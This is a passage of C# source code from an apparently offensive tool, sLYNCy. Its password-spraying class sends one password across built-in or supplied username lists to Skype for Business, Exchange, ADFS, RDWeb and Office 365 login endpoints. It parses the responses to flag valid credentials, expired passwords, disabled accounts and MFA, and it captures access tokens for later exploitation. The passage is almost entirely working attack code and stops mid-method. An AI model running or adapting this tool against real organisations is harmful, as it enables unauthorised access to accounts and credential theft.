using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using static sLYNCy_WPF.Enums;
using static sLYNCy_WPF.Utilities;

namespace sLYNCy_WPF
{
    public class PasswordSpray
    {
        //VARIABLES
        private Task t;
        private List<string> preparedUsernames;
        public object pause = new object();
        public bool paused = false;
        public bool resume = false;
        public bool killSwitch = false;
        public int earlierVersionOnce = 0;
        public int laterVersionOnce = 0;
        public static string ntlmXML = @"<s:Envelope xmlns:s=""http://schemas.xmlsoap.org/soap/envelope/""><s:Header><Security s:mustUnderstand=""1"" xmlns:u=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"" xmlns=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd""><UsernameToken><Username>{0}</Username><Password Type=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText"">{1}</Password></UsernameToken></Security></s:Header><s:Body><RequestSecurityToken xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" Context=""ec86f904-154f-0597-3dee-59eb1b51e731"" xmlns=""http://docs.oasis-open.org/ws-sx/ws-trust/200512""><TokenType>urn:component:Microsoft.Rtc.WebAuthentication.2010:user-cwt-1</TokenType><RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</RequestType><AppliesTo xmlns=""http://schemas.xmlsoap.org/ws/2004/09/policy""><EndpointReference xmlns=""http://www.w3.org/2005/08/addressing""><Address>https://2013-lync-fe.contoso.com/WebTicket/WebTicketService.svc/Auth</Address></EndpointReference></AppliesTo><Lifetime><Created xmlns=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"">2016-06-07T02:23:36Z</Created><Expires xmlns=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"">2016-06-07T02:38:36Z</Expires></Lifetime><KeyType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/SymmetricKey</KeyType></RequestSecurityToken></s:Body></s:Envelope>";

        public void Stop(MainWindow UI)
        {
            if (t != null)
            {
                //PAUSE HERE
                UI.ThreadSafeAppendLog("[4]Requested stop...");
                killSwitch = true;
            }
        }

        public void Pause(MainWindow UI)
        {
            if (t != null)
            {
                //PAUSE HERE
                UI.ThreadSafeAppendLog("[4]Requested pause...");
                t = Task.Run(() =>
                {
                    lock (pause)
                    {
                        while (resume != true)
                        {

                        }
                        UI.ThreadSafeAppendLog("[3]Pause released");
                        resume = false;
                        paused = false;
                        return;
                    }
                });
            }
        }

        public void Resume(MainWindow UI)
        {
            if (t != null)
            {
                //PAUSE HERE
                UI.ThreadSafeAppendLog("[4]Requested resume...");
                resume = true;
            }
        }

        public void SprayUsers(PasswordSprayType method, string filepath, string formatChoice, string password, MainWindow UI, UsernameFormat discoveredFormat, Hostnames host, MicrosoftService service, string MSISSamlRequest)
        {
            earlierVersionOnce = 0;
            laterVersionOnce = 0;

            paused = false;
            resume = false;
            killSwitch = false;

            t = Task.Run(() =>
            {
                if (ValidateOptions(method, formatChoice, UI, discoveredFormat))
            {
                UI.lockUI(SendingWindow.PasswordSpray);
                preparedUsernames = new List<string>();


                    if (host.SprayURL != null)
                    {
                        //If it's NTLM choose SendingWindow.UserENum - to FORCE LEGACY FORMAT
                        if (host.SprayURL.Type == URLType.NTLM)
                        {
                            switch (method)
                            {
                                //Each case just needs to prepare usernames in it's own way - then later we switch case on service - create requests - etc
                                //User prep now needs option to only discard if user AND password exist - ie, we are spraying existing users - just not existing users AND passwords

                                //USE SENDING WINDOW PASSSPRAY - WHICH MEANS WE DEFAULT TO MODERN STYLE FOR USERNAMES - OR USE TOTALLY SAME FORMAT FOR ALREADY ENUMMED USERS
                                //MODERN STYLE FOR NONE DISCOVERED FORMAT
                                //DISCOVERED LEGACY FORMAT > MODERNSTYLE CHOSEN/LIST (UNLESS CONTAINS ALREADY) - ENUMMED USERS JUST EXACTLY AS THEY ARE - TAKE FULL NEVTEK\CSCOTT NOT JUST USER
                                //May just be going enum style later
                                case PasswordSprayType.UseDiscoveredFormat:
                                    preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, String.Format("sLYNCy_WPF.Helper.Usernames.UsernamesFormat.{0}.txt", discoveredFormat), UI, null), host, UI, SendingWindow.UserEnum, method);
                                    break;
                                case PasswordSprayType.UseChosenFormat:
                                    preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, String.Format("sLYNCy_WPF.Helper.Usernames.UsernamesFormat.{0}.txt", formatChoice), UI, null), host, UI, SendingWindow.UserEnum, method);
                                    break;
                                case PasswordSprayType.UsernameListCouncil:
                                    preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesInBuilt.CouncilKillerv5.txt", UI, null), host, UI, SendingWindow.UserEnum, method);
                                    break;
                                case PasswordSprayType.UsernameListFile:
                                    preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.File, filepath, UI, null), host, UI, SendingWindow.UserEnum, method);
                                    break;
                                case PasswordSprayType.UsernameListService:
                                    preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesInBuilt.service-accounts.txt", UI, null), host, UI, SendingWindow.UserEnum, method);
                                    break;
                                case PasswordSprayType.UsernameListStandard:
                                    preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesInBuilt.standard-accounts.txt", UI, null), host, UI, SendingWindow.UserEnum, method);
                                    break;
                                case PasswordSprayType.EnumeratedUsers:
                                    preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.Enumerated, null, UI, null), host, UI, SendingWindow.UserEnum, method);
                                    //NEEDS TO TAKE ACCESSTOKENS RECORDS LIST - NEW TYPE FOR USERNAME PREP - LOAD IN FROM THERE FIRST - MAYBE DO SEPERATE METHOD SO AS NOT TO F'UPP ALL OTHER CALLS TO IT?
                                    break;
                            }
                        }
                        else
                        {
                            //What we normally would do
                            switch (method)
                            {
                                //Each case just needs to prepare usernames in it's own way - then later we switch case on service - create requests - etc
                                //User prep now needs option to only discard if user AND password exist - ie, we are spraying existing users - just not existing users AND passwords

                                //USE SENDING WINDOW PASSSPRAY - WHICH MEANS WE DEFAULT TO MODERN STYLE FOR USERNAMES - OR USE TOTALLY SAME FORMAT FOR ALREADY ENUMMED USERS
                                //MODERN STYLE FOR NONE DISCOVERED FORMAT
                                //DISCOVERED LEGACY FORMAT > MODERNSTYLE CHOSEN/LIST (UNLESS CONTAINS ALREADY) - ENUMMED USERS JUST EXACTLY AS THEY ARE - TAKE FULL NEVTEK\CSCOTT NOT JUST USER
                                //May just be going enum style later
                                case PasswordSprayType.UseDiscoveredFormat:
                                    preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, String.Format("sLYNCy_WPF.Helper.Usernames.UsernamesFormat.{0}.txt", discoveredFormat), UI, null), host, UI, SendingWindow.PasswordSpray, method);
                                    break;
                                case PasswordSprayType.UseChosenFormat:
                                    preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, String.Format("sLYNCy_WPF.Helper.Usernames.UsernamesFormat.{0}.txt", formatChoice), UI, null), host, UI, SendingWindow.PasswordSpray, method);
                                    break;
                                case PasswordSprayType.UsernameListCouncil:
                                    preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesInBuilt.CouncilKillerv5.txt", UI, null), host, UI, SendingWindow.PasswordSpray, method);
                                    break;
                                case PasswordSprayType.UsernameListFile:
                                    preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.File, filepath, UI, null), host, UI, SendingWindow.PasswordSpray, method);
                                    break;
                                case PasswordSprayType.UsernameListService:
                                    preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesInBuilt.service-accounts.txt", UI, null), host, UI, SendingWindow.PasswordSpray, method);
                                    break;
                                case PasswordSprayType.UsernameListStandard:
                                    preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesInBuilt.standard-accounts.txt", UI, null), host, UI, SendingWindow.PasswordSpray, method);
                                    break;
                                case PasswordSprayType.EnumeratedUsers:
                                    preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.Enumerated, null, UI, null), host, UI, SendingWindow.PasswordSpray, method);
                                    //NEEDS TO TAKE ACCESSTOKENS RECORDS LIST - NEW TYPE FOR USERNAME PREP - LOAD IN FROM THERE FIRST - MAYBE DO SEPERATE METHOD SO AS NOT TO F'UPP ALL OTHER CALLS TO IT?
                                    break;
                            }
                        }
                    }
                    else
                    {
                        //What we normally would do
                        switch (method)
                        {
                            //Each case just needs to prepare usernames in it's own way - then later we switch case on service - create requests - etc
                            //User prep now needs option to only discard if user AND password exist - ie, we are spraying existing users - just not existing users AND passwords

                            //USE SENDING WINDOW PASSSPRAY - WHICH MEANS WE DEFAULT TO MODERN STYLE FOR USERNAMES - OR USE TOTALLY SAME FORMAT FOR ALREADY ENUMMED USERS
                            //MODERN STYLE FOR NONE DISCOVERED FORMAT
                            //DISCOVERED LEGACY FORMAT > MODERNSTYLE CHOSEN/LIST (UNLESS CONTAINS ALREADY) - ENUMMED USERS JUST EXACTLY AS THEY ARE - TAKE FULL NEVTEK\CSCOTT NOT JUST USER
                            //May just be going enum style later
                            case PasswordSprayType.UseDiscoveredFormat:
                                preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, String.Format("sLYNCy_WPF.Helper.Usernames.UsernamesFormat.{0}.txt", discoveredFormat), UI, null), host, UI, SendingWindow.PasswordSpray, method);
                                break;
                            case PasswordSprayType.UseChosenFormat:
                                preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, String.Format("sLYNCy_WPF.Helper.Usernames.UsernamesFormat.{0}.txt", formatChoice), UI, null), host, UI, SendingWindow.PasswordSpray, method);
                                break;
                            case PasswordSprayType.UsernameListCouncil:
                                preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesInBuilt.CouncilKillerv5.txt", UI, null), host, UI, SendingWindow.PasswordSpray, method);
                                break;
                            case PasswordSprayType.UsernameListFile:
                                preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.File, filepath, UI, null), host, UI, SendingWindow.PasswordSpray, method);
                                break;
                            case PasswordSprayType.UsernameListService:
                                preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesInBuilt.service-accounts.txt", UI, null), host, UI, SendingWindow.PasswordSpray, method);
                                break;
                            case PasswordSprayType.UsernameListStandard:
                                preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesInBuilt.standard-accounts.txt", UI, null), host, UI, SendingWindow.PasswordSpray, method);
                                break;
                            case PasswordSprayType.EnumeratedUsers:
                                preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.Enumerated, null, UI, null), host, UI, SendingWindow.PasswordSpray, method);
                                //NEEDS TO TAKE ACCESSTOKENS RECORDS LIST - NEW TYPE FOR USERNAME PREP - LOAD IN FROM THERE FIRST - MAYBE DO SEPERATE METHOD SO AS NOT TO F'UPP ALL OTHER CALLS TO IT?
                                break;
                        }

                    }






                if (preparedUsernames.Count > 0)
                {
                    UI.ThreadSafeAppendLog("[2] Usernames to spray: " + preparedUsernames.Count);
                    MainWindow.setTotalUsernames(preparedUsernames.Count);
                    MainWindow.setUsernamesDone(0);
                    UI.counter.startUpdate(SendingWindow.PasswordSpray, UI);
                    //Switch on service and prepare requests how we need - send to validate - and do add record etc as necessary
                    Spray(preparedUsernames, password, UI, host, service, MSISSamlRequest);
                    //Maybe use same "validate" and add bits for right user AND pass - no timing - then maybe add to addRecord record with pass
                }
                else
                {
                    UI.ThreadSafeAppendLog("[1]No usernames to password spray...");
                    
                }
            }
                
            });
        }

        public async void Spray(List<string> usernames, string password, MainWindow UI, Hostnames host, MicrosoftService service, string MSISSamlRequest)
        {
            if (usernames.Count > 0)
            {
                List<Task> listOfSprayTasks = new List<Task>();

                foreach (string username in preparedUsernames)
                {

                    listOfSprayTasks.Add(DoAsync(username, pause, killSwitch, service, UI, password, host, MSISSamlRequest));
                }

                await Task.WhenAll(listOfSprayTasks);
                UI.unlockUI();
            } else
            {
                UI.ThreadSafeAppendLog("[1]No users to spray...");
            }
        }

        public Task DoAsync(string username, object pause, bool killSwitch, MicrosoftService service, MainWindow UI, string password, Hostnames host, string MSISSamlRequest)
        {
            lock (pause)
            {

            }
            if (killSwitch == true)
            {
                return Task.CompletedTask;
            }

            CredentialsRecord user = SprayRequest(username, service, UI, password, host, MSISSamlRequest);
            if (user != null)
            {
                //CALL ADD USER RECORD - WHICH CHECKS IF IT'S ALREADY THERE, ADDS IF NOT AND SAVES CREDSRECORDS
                //ALL SAVES NEED TO APPEND TO EXISTING FILE
                //AS WE ARE UNIQUING - CAN JUST ALWAYS APPEND AND WILL NOT MESS UP WHAT'S THERE AND WILL ONLY BE WRITING UNIQUE ANYWAY
                //APPEND NEW LINE IF EXISTS - OR CREATE, AND ADD COLUMNS AND NEW LINE OTHERWISE
                //MESSAGE ALREADY DISPLAYED FROM ENUMERATEREQUEST METHOD
                if (user.AccountDisabled != "Y")
                {
                    UI.ThreadSafeAppendLog("[1][!] Valid Credentials: " + username + ":" + password);
                }
                else
                {
                    UI.ThreadSafeAppendLog("[2][$] Account Disabled: " + username);
                }
                AddCredentialRecord.Add(user, UI.accessTokens, UI, service);

            }
            else
            {
                //INVALID USER - NO WORRIES
                UI.ThreadSafeAppendLog("[3]Invalid user/pass: " + username + ":" + password);
            }
            MainWindow.addToUsernamesDone();
            return Task.CompletedTask;
        }

        private CredentialsRecord EnumStyleParse(HttpWebResponse responseObject, MicrosoftService service, string username, string password, MainWindow UI)
        {
            if (responseObject != null)
            {
                try
                {
                    Stream test = responseObject.GetResponseStream();
                    string responseString = "";
                    if (test.CanRead)
                    {
                        responseString = new StreamReader(responseObject.GetResponseStream()).ReadToEnd();
                    }
                    WebHeaderCollection headers = responseObject.Headers;
                    CookieCollection cookies = responseObject.Cookies;


                    //So - we make a request - then if there are any specifics in the responses - return valid Credentials record
                    switch (service)
                    {
                        case MicrosoftService.Exchange:
                            string[] caValues = headers.GetValues("Set-Cookie");
                            if (caValues != null)
                            {
                                foreach (string value in caValues)
                                {
                                    if (value.Contains("cadata"))
                                    {
                                        UI.ThreadSafeAppendLog("[1][!] Valid credentials found for Exchange: " + username);
                                        return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "", Service = MicrosoftService.Exchange };
                                    }
                                    else if (value.Contains("expiredpassword.aspx"))
                                    {
                                        UI.ThreadSafeAppendLog("[1][!] Valid credentials found for Exchange - Password has expired: " + username);
                                        return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "", Service = MicrosoftService.Exchange, PasswordExpired = "Y" };
                                    }
                                }
                            }
                            break;
                        case MicrosoftService.ADFS:
                            if (responseObject.StatusCode == HttpStatusCode.Redirect)
                            {
                                UI.ThreadSafeAppendLog("[1][!] Valid credentials found for ADFS: " + username);
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "", Service = MicrosoftService.ADFS };
                            }
                            break;
                        case MicrosoftService.Skype:
                            if (responseString.Contains("User is not SIP enabled"))
                            {
                                UI.ThreadSafeAppendLog("[1][!] Valid Credentials found - User not SIP enabled: " + username);
                                UI.ThreadSafeAppendLog("[2][*] This user has not been enabled for Skype for Business, however, their credentials should work anywhere else - perhaps outlook? ;-)");
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "N", Service = MicrosoftService.Skype };
                            }
                            else if (responseString.Contains("The account is disabled."))
                            {
                                UI.ThreadSafeAppendLog("[1][$] Valid Username found - account is disabled: " + username);
                                UI.ThreadSafeAppendLog("[2][*] This account is disabled and we cannot discover the password or use the account in any way.");
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = "", AccountDisabled = "Y", SipEnabled = "", Service = MicrosoftService.Skype };
                            }
                            else if (responseString.Contains("The password has expired."))
                            {
                                UI.ThreadSafeAppendLog("[1][!] Valid credentials found - Password has expired: " + username);
                                UI.ThreadSafeAppendLog("[2][*] This account's AD password has expired, however, the password may have been re-used on other portals - or you may get an option to change it.");
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, PasswordExpired = "Y", SipEnabled = "", Service = MicrosoftService.Skype };
                            }
                            else if (responseString.Contains("ActionNotSupported"))
                            {
                                UI.ThreadSafeAppendLog("[1][!] Valid credentials found - User SIP enabled: " + username);
                                UI.ThreadSafeAppendLog("[2][*] This account can be used in the Post Creds tab!!");
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "Y", Service = MicrosoftService.Skype };
                            }
                            else if (responseString.Contains("Internal error while processing Windows authentication or authorization."))
                            {
                                UI.ThreadSafeAppendLog("[1][!] Valid credentials found - Internal Server Error Authenticating: " + username);
                                UI.ThreadSafeAppendLog("[2][*] An internal error occured when the Skype for Business server attempted to authenticate to the DC. The credentials are correct, however the server or AD domain may be in a broken state, and this account cannot be used for Post Creds/Exploitation by Carnivore.");
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, ServerError = "Y", SipEnabled = "", Service = MicrosoftService.Skype };
                            }
                            break;
                        case MicrosoftService.RDWeb:
                            foreach (Cookie cook in cookies)
                            {
                                if (cook.Name == "TSWAAuthHttpOnlyCookie")
                                {
                                    if (cook.Value != null && cook.Value != "")
                                    {
                                        UI.ThreadSafeAppendLog("[1][!] Valid credentials found for RDWeb: " + username);
                                        return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "", Service = MicrosoftService.RDWeb };
                                    }
                                }
                            }
                            if (responseString.Contains("Error=PasswordExpired"))
                            {
                                UI.ThreadSafeAppendLog("[1][!] Valid credentials found for RDWeb - Password has expired: " + username);
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, PasswordExpired = "Y", SipEnabled = "", Service = MicrosoftService.RDWeb };
                            }
                            break;
                        case MicrosoftService.Office365:
                            if (responseString.Contains("eas") || responseString.Contains("Object moved"))
                            {
                                //Invalid
                            }
                            else
                            {
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = "", SipEnabled = "", Service = service };
                            }
                            break;
                    }

                    return null;
                }
                catch (Exception eptt)
                {
                    return null;
                }
            }
            else
            //We don't even have a response object - null
            {
                return null;
            }
        }

        public CredentialsRecord SprayRequest(string username, MicrosoftService service, MainWindow UI, string password, Hostnames host, string MSISSamlRequest)
        {
            HttpWebResponse responseObject = PassSpraySendRequest(username, service, host, UI, MSISSamlRequest, password);

            if (responseObject != null)
            {
                if (host.SprayURL == null)
                {
                    //Enum style
                    return EnumStyleParse(responseObject, service, username, password, UI);
                } else if (host.SprayURL.Type == URLType.NTLM)
                {
                    if (responseObject.StatusCode == HttpStatusCode.Unauthorized || responseObject.StatusCode == HttpStatusCode.Forbidden)
                    {
                        string responseNTLMHeaders = responseObject.Headers.ToString();
                        if (responseNTLMHeaders != null)
                        {
                            if (responseNTLMHeaders.Contains("WWW-Authenticate"))
                            {

                            }
                            else
                            {
                                //Shouldn't get this far as enum/validation should catch it
                                UI.ThreadSafeAppendLog("[1]Looks like this NTLM endpoint isn't valid...");
                                Stop(UI);
                            }
                        }
                    }
                    else
                    {
                        Stream test = responseObject.GetResponseStream();
                        string responseStringNTLM = "";
                        if (test.CanRead)
                        {
                            responseStringNTLM = new StreamReader(responseObject.GetResponseStream()).ReadToEnd();
                        }
                        WebHeaderCollection headers = responseObject.Headers;
                        CookieCollection cookies = responseObject.Cookies;
                        return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "", Service = service };
                    }
                } 
                else
                {

                    try
                    {
                        Stream test = responseObject.GetResponseStream();
                        string responseString = "";
                        if (test.CanRead)
                        {
                            responseString = new StreamReader(responseObject.GetResponseStream()).ReadToEnd();
                        }
                        WebHeaderCollection headers = responseObject.Headers;
                        CookieCollection cookies = responseObject.Cookies;

                        switch (service)
                        {
                            case MicrosoftService.ADFS:
                                if (responseObject.StatusCode == HttpStatusCode.Redirect)
                                    return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "", Service = MicrosoftService.ADFS };
                                break;
                            case MicrosoftService.Exchange:
                                if (responseObject.StatusCode == HttpStatusCode.InternalServerError)
                                    return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "", Service = MicrosoftService.Exchange };
                                if (headers.ToString().Contains("Server: Microsoft-IIS/7.5"))
                                    if (earlierVersionOnce == 0)
                                    {
                                        UI.ThreadSafeAppendLog("[2]Server version returned IIS 7.5 - it is possible this is an earlier version of exchange...");
                                        earlierVersionOnce = 1;
                                    }
                                break;
                            case MicrosoftService.Exchange2007:
                                if (responseString.Contains("<ErrorCode>600</ErrorCode>"))
                                    return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "", Service = MicrosoftService.Exchange2007 };
                                if (headers.ToString().Contains("X-FEServer:"))
                                    if (laterVersionOnce == 0)
                                    {
                                        UI.ThreadSafeAppendLog("[2]Server returned X-FEServer header - it is possible this is a later version of exchange...");
                                        laterVersionOnce = 1;
                                    }
                                break;
                            case MicrosoftService.Office365:
                                if (responseString.Contains("Application with identifier"))
                                    return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "", Service = MicrosoftService.Office365 };
                                else if (responseString.Contains("multi-factor authentication"))
                                    return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, MFA = "Y", SipEnabled = "", Service = MicrosoftService.Office365 };
                                else if (responseString.Contains("The user account {EmailHidden}"))
                                    UI.ThreadSafeAppendLog("[2]Invalid username - the username can be removed from your spray list: " + username);
                                else if (responseString.Contains("No tenant-identifying information found in either the request"))
                                    UI.ThreadSafeAppendLog("[2]The domain does not exist on O365: " + username);
                                break;
                            case MicrosoftService.RDWeb:
                                if (responseObject.StatusCode == HttpStatusCode.Redirect)
                                    return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "", Service = MicrosoftService.RDWeb };
                                break;
                            case MicrosoftService.Skype:
                                if (responseString.Contains("access_token"))
                                {
                                    Match accessTokenMatch = RegexClass.ReturnMatch(Regexs.cwtToken, responseString);
                                    if (accessTokenMatch.Success)
                                    {
                                        string accessToken = accessTokenMatch.Value;
                                        return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Token = accessToken, Password = password, SipEnabled = "Y", Service = MicrosoftService.Skype };
                                    }
                                    else
                                    {
                                        UI.ThreadSafeAppendLog("[1]Unable to match access token...");
                                        return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "Y", Service = MicrosoftService.Skype };
                                    }

                                }
                                else if (responseString.Contains("server_error"))
                                    return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, ServerError = "Y", Service = MicrosoftService.Skype };
                                else if (headers.ToString().Contains("The account is disabled"))
                                    return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = "", AccountDisabled = "Y", Service = MicrosoftService.Skype };
                                break;
                        }
                    }
                    catch (Exception e)
                    {
                        return null;
                    }
                }
            }

            return null;
        }

        public static WebRequests CreateWebRequestSpray(string url, MainWindow UI, HttpMethodChoice method, bool allowRedirect)
        {
            WebRequests r = new WebRequests();
            r.url = url;
            r.InitialiseRequest();
            r.UI = UI;
            r.request.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1";
            if (method == HttpMethodChoice.GET)
                r.request.Method = "GET";
            else if (method == HttpMethodChoice.POST)
                r.request.Method = "POST";

            if (allowRedirect != true)
                r.request.AllowAutoRedirect = false;

            return r;
        }

        private HttpWebResponse EnumStyle(MicrosoftService service, Hostnames host, MainWindow UI, string username, string password, string MSISSamlRequest, string ntlmXML)
        {
            WebRequests userEnumRequest = null;
            if (service == MicrosoftService.Office365)
            {

            }
            else if (service == MicrosoftService.ADFS)
            {
                userEnumRequest = CreateWebRequestSpray(host.EnumURL.Url + "?client-request-id=&pullStatus=0", UI, HttpMethodChoice.GET, true);
            }
            else
            {
                userEnumRequest = CreateWebRequestSpray(host.EnumURL.Url, UI, HttpMethodChoice.GET, true);
            }

            switch (service)
            {
                case MicrosoftService.Skype:
                    userEnumRequest.postData = string.Format(ntlmXML, System.Convert.ToBase64String(System.Text.Encoding.ASCII.GetBytes(username)), System.Convert.ToBase64String(System.Text.Encoding.ASCII.GetBytes(password)));
                    userEnumRequest.request.ContentType = "text/xml; charset=utf-8";
                    UI.ThreadSafeAppendLog("[3]Skype Post Data: " + userEnumRequest.postData);
                    UI.ThreadSafeAppendLog("[3]Skype URL: " + userEnumRequest.url);
                    break;
                case MicrosoftService.Exchange:
                    userEnumRequest.postData = string.Format("destination={0}&flags=4&forcedownlevel=0&username={1}&password={2}&isUtf8=1&trusted=0", host.EnumURL.Url.Replace("auth.owa", ""), username, Uri.EscapeDataString(password));
                    userEnumRequest.request.ContentType = "application/x-www-form-urlencoded";
                    userEnumRequest.request.AllowAutoRedirect = false;
                    UI.ThreadSafeAppendLog("[3]Exchange Post Data: " + userEnumRequest.postData);
                    UI.ThreadSafeAppendLog("[3]Exchange URL: " + userEnumRequest.url);
                    break;
                case MicrosoftService.RDWeb:
                    userEnumRequest.postData = string.Format("DomainUserName={0}&UserPass={1}", username, Uri.EscapeDataString(password));
                    userEnumRequest.request.ContentType = "application/x-www-form-urlencoded";
                    UI.ThreadSafeAppendLog("[3]RDWeb Post Data: " + userEnumRequest.postData);
                    UI.ThreadSafeAppendLog("[3]RDWeb URL: " + userEnumRequest.url);
                    break;
                case MicrosoftService.ADFS:
                    if (MSISSamlRequest == null || MSISSamlRequest == "")
                    {
                        UI.ThreadSafeAppendLog("[2]SAML Data not found...");
                    }
                    else
                    {
                        userEnumRequest.request.CookieContainer = new CookieContainer();
                        userEnumRequest.request.CookieContainer.Add(userEnumRequest.request.RequestUri, new Cookie("MSISSamlRequest", MSISSamlRequest));
                        userEnumRequest.request.ContentType = "application/x-www-form-urlencoded";
                        userEnumRequest.request.AllowAutoRedirect = false;
                        userEnumRequest.postData = string.Format("UserName={0}&Password={1}&AuthMethod=FormsAuthentication", username, Uri.EscapeDataString(password));
                        UI.ThreadSafeAppendLog("[3]ADFS Post Data: " + userEnumRequest.postData);
                        UI.ThreadSafeAppendLog("[3]ADFS URL: " + userEnumRequest.url);
                    }
                    break;
                case MicrosoftService.Office365:
                    userEnumRequest = CreateWebRequestSpray("https://outlook.office365.com/autodiscover/autodiscover.json?Email=" + username + "&Protocol=ActiveSync&RedirectCount=1", UI, HttpMethodChoice.POST, false);
                    UI.ThreadSafeAppendLog("[3]O365 Request: " + "https://outlook.office365.com/autodiscover/autodiscover.json?Email=" + username + "&Protocol=ActiveSync&RedirectCount=1");
                    break;
            }

            try
            {
                if (service == MicrosoftService.Office365)
                {
                    return userEnumRequest.MakeGETRequest();
                }
                else
                {
                    UI.ThreadSafeAppendLog("[4]Making Send Request...");
                    return userEnumRequest.MakePOSTRequest();
                }
            }
            catch (Exception e)
            {
                UI.ThreadSafeAppendLog("[1]EXCEPTION: " + e.ToString());
                return null;
            }
        }

        private HttpWebResponse PassSpraySendRequest(string username, MicrosoftService service, Hostnames host, MainWindow UI, string MSISSamlRequest, string password)
        {
            WebRequests passSprayRequest = null;
            
            if (host.SprayURL == null)
            {
                //Use User Enum
                //This option over NTLM as can determine more than valid/invalid
                return EnumStyle(service, host, UI, username, password, MSISSamlRequest, password);
            }
            else if (host.SprayURL.Type == URLType.NTLM)
            {
                //So this is the same for all - if NTLM - just NTLM spray it - 401/403 is bad - else good
                //Also - if response NOT CONTAIN NTLM || Negotiate - probably not sprayable? Shouldn't have got to this stage though
                passSprayRequest = CreateWebRequestSpray(host.SprayURL.Url, UI, HttpMethodChoice.POST, false);
                passSprayRequest.request.Credentials = new NetworkCredential(username, password);
                byte[] data = Encoding.ASCII.GetBytes("");
